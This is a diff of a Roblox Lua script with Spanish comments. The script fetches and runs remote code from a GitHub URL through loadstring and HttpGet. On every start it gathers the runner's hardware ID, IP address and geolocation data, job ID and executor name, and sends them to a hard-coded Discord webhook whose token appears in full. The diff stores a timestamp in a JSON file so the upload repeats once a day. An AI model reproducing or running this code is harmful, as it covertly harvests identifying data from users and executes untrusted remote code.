@@ -1,12 +1,44 @@
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Fernanflop091o/Queuet/refs/heads/main/Afk.lua"))()
+
 local HttpService = game:GetService("HttpService")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local Players = game:GetService("Players")
 local RbxAnalyticsService = game:GetService("RbxAnalyticsService")
 
 local discordWebhookUrl = "https://discord.com/api/webhooks/1286118077829742593/KbfczS76YlMW7x_Q9vbA60XRE78_xc9uvDZOGkzLU5AEfP-fH1iX-_P6YzBg7d6-WiJn"
-local lastSentTime = 0
 local sendInterval = 86400  -- 24 horas en segundos
+local jsonFilePath = "lastSentTime.json"
+
+-- Función para guardar datos en un archivo JSON
+local function saveToJsonFile(data)
+    local success, response = pcall(function()
+        local jsonData = HttpService:JSONEncode(data)
+        writefile(jsonFilePath, jsonData)  -- Guarda el archivo JSON
+    end)
+    
+    if not success then
+        warn("Error al guardar en el archivo JSON:", response)
+    end
+end
+
+-- Función para cargar datos desde un archivo JSON
+local function loadFromJsonFile()
+    if not isfile(jsonFilePath) then
+        return nil
+    end
+    
+    local success, data = pcall(function()
+        local jsonData = readfile(jsonFilePath)
+        return HttpService:JSONDecode(jsonData)
+    end)
+    
+    if success then
+        return data
+    else
+        warn("Error al leer el archivo JSON:", data)
+        return nil
+    end
+end
 
 -- Función para obtener el ID del trabajo y HWID del jugador
 local function getJobIdAndHwid()
@@ -107,14 +139,6 @@ end
 
 -- Función para enviar la información del jugador a Discord
 local function sendPlayerInfoToDiscord()
-    -- Control de tiempo para asegurarse de que solo se envíe una vez cada 24 horas
-    local currentTime = os.time()
-    if currentTime - lastSentTime < sendInterval then
-        warn("Ya se ha enviado información en las últimas 24 horas")
-        return
-    end
-    lastSentTime = currentTime
-
     local jobId, hwid = getJobIdAndHwid()
     local ip, ipData = getPlayerIPInfo()
     local executor = detectExecutor()
@@ -188,5 +212,25 @@ local function sendPlayerInfoToDiscord()
     end
 end
 
--- Enviar la información del jugador al ejecutar el script
-sendPlayerInfoToDiscord()
+-- Cargar el tiempo desde el archivo JSON
+local function checkAndSendPlayerInfo()
+    local currentTime = os.time()
+    local data = loadFromJsonFile()
+
+    if data and data.lastSentTime then
+        local timeSinceLastSend = currentTime - data.lastSentTime
+        if timeSinceLastSend < sendInterval then
+            warn("Ya se ha enviado información en las últimas 24 horas.")
+            return
+        end
+    end
+
+    -- Enviar la información si han pasado más de 24 horas
+    sendPlayerInfoToDiscord()
+
+    -- Guardar el nuevo tiempo en el archivo JSON
+    saveToJsonFile({ lastSentTime = currentTime })
+end
+
+-- Ejecutar la función al iniciar el script
+checkAndSendPlayerInfo()
